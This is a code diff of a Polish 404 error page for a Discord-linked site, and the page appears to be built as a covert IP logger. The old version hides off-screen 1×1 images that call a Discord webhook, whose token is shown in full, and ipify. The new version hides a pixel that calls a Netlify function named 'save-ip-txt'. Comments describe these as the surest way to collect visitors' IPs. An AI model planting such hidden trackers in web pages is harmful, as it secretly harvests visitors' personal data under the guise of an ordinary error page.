@@ -1,99 +1,50 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Strona nie znaleziona – 404</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>404 - Strona nie znaleziona</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
       height: 100vh;
-      background: #0d0d12;
-      color: #e0e0ff;
-      font-family: system-ui, -apple-system, sans-serif;
+      background: #0f0f23;
+      color: #ddd;
+      font-family: system-ui, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       text-align: center;
     }
-    .container {
-      max-width: 480px;
-      padding: 30px;
-    }
-    h1 {
-      font-size: 5.5rem;
-      margin: 0 0 0.3em;
-      color: #5865f2;
-      font-weight: 800;
-      letter-spacing: -2px;
-    }
-    .text {
-      font-size: 1.25rem;
-      color: #a0a0c0;
-      line-height: 1.5;
-      margin: 0 0 2.2rem;
-    }
-    .btn {
-      display: inline-block;
+    .content { max-width: 480px; padding: 30px; }
+    h1 { font-size: 7rem; margin: 0; color: #5865f2; }
+    p { font-size: 1.4rem; color: #aaa; margin: 1rem 0 2.5rem; }
+    a {
       padding: 14px 40px;
       background: #5865f2;
       color: white;
       text-decoration: none;
       border-radius: 8px;
       font-size: 1.1rem;
-      font-weight: 500;
-      transition: background 0.2s;
     }
-    .btn:hover {
-      background: #4752c4;
-    }
-    .small {
-      margin-top: 3rem;
-      font-size: 0.78rem;
-      color: #606080;
-    }
-
-    /* 1×1 pikselowy logger – niewidoczny */
-    .logger {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      left: -9999px;
-      opacity: 0;
-      pointer-events: none;
-    }
+    a:hover { background: #4752c4; }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>404</h1>
-  <p class="text">
-    Wygląda na to, że strona której szukasz<br>
-    nie istnieje albo została przeniesiona.
-  </p>
-
-  <a href="https://discord.gg/" class="btn">
-    Wróć na serwer →
-  </a>
-
-  <div class="small">
-    © 2026 ChatifyNetworks
+  <div class="content">
+    <h1>404</h1>
+    <p>Strona której szukasz nie istnieje albo została przeniesiona.</p>
+    <a href="https://discord.gg/">← Wróć na serwer</a>
   </div>
-</div>
 
-<!-- Główny sposób zbierania IP w 2025/2026 – najpewniejszy na Netlify -->
-<img 
-  class="logger"
-  src="https://discord.com/api/webhooks/1460323910787530907/J0NXhcXMEpvHMYpKVwmH3ebjYXSitXJ-GX5N8ugXYq56hOTZre5unG6Uqqv329UhOHHp"
-/>
-
-<!-- Dodatkowa próba na wszelki wypadek -->
-<img 
-  class="logger"
-  src="https://api.ipify.org"
-/>
+  <!-- Wywołanie funkcji Netlify – tu dzieje się magia -->
+  <img 
+    src="/.netlify/functions/save-ip-txt" 
+    width="1" height="1" 
+    style="position:absolute; left:-9999px; opacity:0;"
+    alt=""
+  >
 
 </body>
 </html>
